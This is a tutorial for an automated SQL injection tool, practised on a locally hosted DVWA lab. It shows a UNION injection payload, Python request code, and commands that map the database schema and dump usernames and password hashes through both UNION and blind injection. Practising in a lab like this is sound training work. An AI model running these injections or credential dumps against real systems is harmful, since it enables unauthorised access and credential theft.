# First steps: DVWA union and blind

## Tutorial description

DBMS | Type | Tags
-|-|-
MySQL | UNION, Blind | first steps

To give an introduction to **ending**, its commands, and the automatic configuration, we'll attack DVWA. [Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA) is a vulnerable web box, which contains several SQL injections. We will target the pages that are vulnerable to the UNION and blind injections, letting **ending configure the injections automatically**, and introducing the basics of the `query` and `map` commands.

## Target setup

To spawn the target using docker, use:

```bash
$ git clone https://github.com/cfreal/ending-tutorials
$ cd ending-tutorials/first-steps
$ sudo docker build -t ending-tutorials/first-steps .
$ sudo docker run -p 80:80 --rm ending-tutorials/first-steps
```

To check that everything works fine, reach `http://localhost/vulnerabilities/sqli/`, which should display a form with a single input.

## Part 1: UNION SQL injection

The vulnerable page is at `http://localhost/vulnerabilities/sqli/`. You can try fiddling with it yourself: if you submit a single quote for instance, you get a *500*, which is very promising. This is in fact a very simple UNION SQL injection, which we could exploit by hand, with a payload such as:

```
' UNION SELECT 'a', version() -- -
```

 However, doing it with **ending** is faster. We'll just tell the tool where to inject, and it'll find out all the other details itself.

Let's create a new design using `create`:

```bash
$ ending dvwa-union create
```

!!! note

    A file should open in your favorite code editor. If not, open it yourself: `~/ending/dvwa-union/design.py`.


A design is a python file that tells **ending** how to inject. To let **ending** automatically configure the injection, we only need to code the `Design.send()` method. This method is responsible for sending payloads to the target. It takes, as a single argument, the *payload*, a *string*, and returns the *response* of the server as *bytes*.

In our case, the SQL injection can be triggered by issuing a GET request to `http://localhost/vulnerabilities/sqli/?id=<payload>&Submit=Submit`, so we can create our `send()` method like so:

```python
class Design(HTTPDesign):
    async def send(self, payload: str) -> bytes:
        """Sends given payload to the target and returns the response as bytes.
        """
        response = await self.session.get(
            "http://localhost/vulnerabilities/sqli/",
            params={
                "id": payload,
                "Submit": "Submit"
            }
        )
        return response.content
```

!!! note

    The API of `self.session` is the same as the one of `requests`, but asynchronous.

Now that **ending** can send arbitrary payloads, it can try to self-configure. To do so, run `configure`:

```bash
$ ending dvwa-union configure
```

The automatic configuration should go smoothly.

Check the design file again: **ending** automatically added additional methods such as `inject()`, `set_compiler()`, or `set_mapper()`. You more complex injection cases, you can edit them yourself, but in this case, we are **done**!

You can make sure that everything is **OK** using `validate`:

```bash
$ ending dvwa-union validate
```

Our SQL injection design is now completely set up, and we can run queries!

### Using `map` to dump the schema

We now want to dump the users and passwords of the application. To do so, we need to know the name of the table that stores the users, and its columns. We can get information about the schema of a database using `map`. Let us first get the names of the databases:

```bash
$ ending dvwa-union map databases
```

We get `dvwa` and `information_schema`. The latter being a default database of MySQL, we're interested in the former: `dvwa`. We can dump its tables and columns using `map columns`: 

```bash
$ ending dvwa-union map columns -d dvwa
```

Amongst other, the `users` table contains two interesting fields: `user` and `password`.

### Running SQL queries (`query`)

To run a query that selects `user` and `password` from `users`, we use `query`:

```bash
$ ending dvwa-union query -t users -f user password
```

`-t` (or `--table`) indicates the table, while `-f` (`--fields`) indicates a list of fields.

We're done. The results are automatically saved in the design directory, both as a CSV file and as human readable representation.

## Part 2: Blind SQL injection

Let us now target the blind SQL injection page at `http://localhost/vulnerabilities/sqli_blind/`. By playing with the only field of the form, we can see that if we enter a small ID, such as `1`, we get a different message than with other values.

Again, we'll let **ending** configure itself. Let's create a new design and edit its `send()` method.

```bash
$ ending dvwa-blind create
```

```python
    async def send(self, payload: str="1") -> bytes:
        """Sends given payload to the target and returns the response as bytes.
        """
        response = await self.session.get(
            "http://localhost/vulnerabilities/sqli_blind/",
            headers={"Cookie": "PHPSESSID=gfb0np1hm09lball50c80hno50; security=low"},
            params={
                "id": payload,
                "Submit": "Submit"
            }
        )
        return response.content
```

!!! note

    By setting `1` as the default value for the `payload` argument, we tell **ending** that it is a valid value for the injected field.
    
We can now ask **ending** to self-configure:

```bash
$ ending dvwa-blind configure
```

We can see that this time, the *TestMethod* injection method was chosen. It is the method responsible for performing blind SQL injections. We can then validate that everything went fine:

```bash
$ ending dvwa-blind validate
```

The configuration is **done**! But since the injection is blind, let us see a few different optimisation tricks to get the data faster.

### Map filters

Dumping the tables and columns of a whole database using a blind SQL injection can be very slow. Generally, as an attacker, we're mostly interested in the table that contains the credentials. With **ending**, you can filter the name of the database, table and column you want to dump using wildcards! To dump every column whose name contains `pass`, we can use:

```bash
$ ending dvwa-blind map columns -c '*pass*'
```

It returns a single result: the `password` column from `dvwa.users`. Let's now dump every column from that table using a database and a table filter:

```bash
$ ending dvwa-blind map columns -d dvwa -t users
```

### Column types

If you know the type and charset of a column, you can tell **ending** about it to greatly increase the speed of the dump. In the previous section, we dumped usernames and passwords. The username field is text, and the passwords are stored in ASCII-hex. Therefore, we add an additional argument `-T TH` to the original command, where `T` stands for `text` and `H` for hexadecimal.

```bash
$ ending dvwa-blind query -t users -f user password -T TH
```

**ending** only uses a charset of 16 characters to dump the password, resulting in a faster dump time.